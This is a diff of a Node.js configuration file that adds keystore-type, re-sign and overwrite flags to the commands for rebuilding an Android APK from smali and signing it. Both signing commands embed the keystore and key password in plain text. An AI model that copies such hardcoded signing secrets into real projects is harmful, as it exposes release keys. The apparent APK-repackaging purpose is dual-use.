@@ -28,14 +28,15 @@ exports.apkBuildPath = path.join(__dirname, '../assets/webpublic/build.apk');
 
 // ApkTool构建命令
 exports.apktoolBuildCommand = `java -jar "${exports.apkTool}" b "${exports.smaliPath}" -o "${exports.apkBuildPath}"`;
-exports.apktoolSignCommand = `java -jar "${exports.apkSign}" -a "${exports.apkBuildPath}" --ks "${exports.certPath}" --ksAlias key0 --ksPass release101 --ksKeyPass release101 --out "${exports.apkOutputPath}"`;
+// 签名命令：添加 --allow-resign 允许重新签名，--overwrite 覆盖已有文件
+exports.apktoolSignCommand = `java -jar "${exports.apkSign}" -a "${exports.apkBuildPath}" --ks "${exports.certPath}" --ksAlias key0 --ksPass release101 --ksKeyPass release101 --ksType JKS --allow-resign --overwrite --out "${exports.apkOutputPath}"`;
 
 // Gradle构建命令 (Windows/Linux兼容，需要Android SDK)
 const isWindows = process.platform === 'win32';
 const gradleCmd = isWindows ? 'gradlew.bat' : './gradlew';
 exports.gradlePath = path.join(exports.clientPath, gradleCmd);
 exports.gradleBuildCommand = `${exports.gradlePath} assembleRelease`;
-exports.gradleSignCommand = `java -jar "${exports.apkSign}" -a "${exports.apkUnsignedPath}" --ks "${exports.certPath}" --ksAlias key0 --ksPass release101 --ksKeyPass release101 --out "${exports.apkOutputPath}"`;
+exports.gradleSignCommand = `java -jar "${exports.apkSign}" -a "${exports.apkUnsignedPath}" --ks "${exports.certPath}" --ksAlias key0 --ksPass release101 --ksKeyPass release101 --ksType JKS --allow-resign --overwrite --out "${exports.apkOutputPath}"`;
 
 exports.messageKeys = {
     camera: '0xCA',
